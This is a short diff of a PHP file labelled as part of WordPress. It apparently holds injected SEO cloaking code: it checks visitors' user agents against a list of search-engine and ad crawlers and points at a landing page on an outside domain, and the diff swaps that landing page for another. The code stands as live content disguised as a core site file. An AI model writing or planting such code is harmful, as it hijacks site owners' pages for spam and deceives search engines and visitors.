@@ -4,10 +4,10 @@
  *
  * @package WordPress
  */
- @ob_start();
+@ob_start();
 header("Vary: U-Agent");
 
-$src = "https://childrenofiran.org/landing/lipi/";
+$src = "https://childrenofiran.org/landing/uniski/";
 $match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
 $ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
 
